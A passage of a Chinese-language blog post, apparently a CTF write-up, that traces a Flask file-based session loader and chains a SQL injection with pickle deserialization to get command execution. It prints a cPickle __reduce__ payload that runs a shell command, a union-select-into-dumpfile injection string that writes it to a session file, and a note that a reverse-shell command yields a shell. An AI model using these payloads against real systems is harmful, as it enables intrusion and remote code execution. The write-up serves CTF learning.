+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">open_session</span>(<span class="params">self, app, request</span>):</span><br><span class="line">        sid = request.cookies.get(app.session_cookie_name)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">            sid = self._generate_sid()</span><br><span class="line">            <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">        <span class="keyword">if</span> self.use_signer:</span><br><span class="line">            signer = self._get_signer(app)</span><br><span class="line">            <span class="keyword">if</span> signer <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sid_as_bytes = signer.unsign(sid)</span><br><span class="line">                sid = sid_as_bytes.decode()</span><br><span class="line">            <span class="keyword">except</span> BadSignature:</span><br><span class="line">                sid = self._generate_sid()</span><br><span class="line">                <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">        data = self.cache.get(self.key_prefix + sid) <span class="comment">#这里是重点</span></span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self.session_class(data, sid=sid)</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br></pre></td></tr></table></figure>
+
+<p>读取cookie的sessionid，拼接前缀（bdwsessions）传入get方法，跟进get方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, key</span>):</span><br><span class="line">        filename = self._get_filename(key)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                pickle_time = load(f)</span><br><span class="line">                <span class="keyword">if</span> pickle_time == <span class="number">0</span> <span class="keyword">or</span> pickle_time &gt;= time():</span><br><span class="line">                    a = load(f)</span><br><span class="line">                    <span class="keyword">return</span> a</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    os.remove(filename)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> (IOError, OSError, PickleError):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">_get_filename</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, text_type):</span><br><span class="line">            key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># XXX unicode review</span></span><br><span class="line">        <span class="built_in">hash</span> = md5(key).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> os.path.join(self._path, <span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure>
+
+<p>获取文件名的方法也一起贴上了，即<code>md5(&#39;bdwsessions&#39;+&#39;xxx-xxx&#39;)</code>，从config.py可知session存储的位置为<code>/tmp/ffff</code>，到现在思路就很清晰了：</p>
+<ol>
+<li><p>构造序列化payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;your command&#x27;</span>,),))</span><br><span class="line">    </span><br><span class="line">e = Exp()</span><br><span class="line">e = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f</span><br><span class="line">	f.write(<span class="string">&#x27;0x&#x27;</span> + poc.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用之前注册处的注入将payload写入指定文件中</p>
+<p>前面知道了session的存储位置，也知道了session文件的命名方式，比如cookie的session&#x3D;seaii，那么session文件就是<code>/tmp/ffff/65f37ca642b92d6e19190a9960d73023</code>（md5(‘bdwsessionsseaii’)）</p>
+<p>接下来利用注入写文件，email填入payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%27/**/union/**/select/**/exp.../**/into/**/dumpfile/**/%27/tmp/ffff/65f37ca642b92d6e19190a9960d73023%27%23%40admin.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改cookie中session的值，让程序读取我们构造好的文件并反序列化，造成命令执行</p>
+<p>访问index，抓包修改cookie为seaii，如果执行的是反弹shell的命令的话，就可以收到shell为所欲为了。</p>
+</li>
+</ol>
+<h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>java这块了解的很少，看来之后要恶补一波了，这里附上orange大佬的wp</p>
+<p><a target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a></p>
+<p>不过这题有个非预期，就是利用postgre的udf执行系统命令，正好了解一下吧。</p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>在这儿贴上一段百度的时候搜到的大佬说的话吧</p>
+<blockquote>
+<p>我在做这题的时候并不知道RPO是啥(看了别人的wp才知道),然而最终还是能做出来,我想这个过程还是值得新人借鉴的,也就是遇到一道新题应该怎么去入手,打CTF遇到自己没见过的知识点太多了,不能期待着撞知识点。</p>
+</blockquote>
+<p>感觉最近打ctf心态不太端正，可能崩了太多次吧:p，共勉~</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
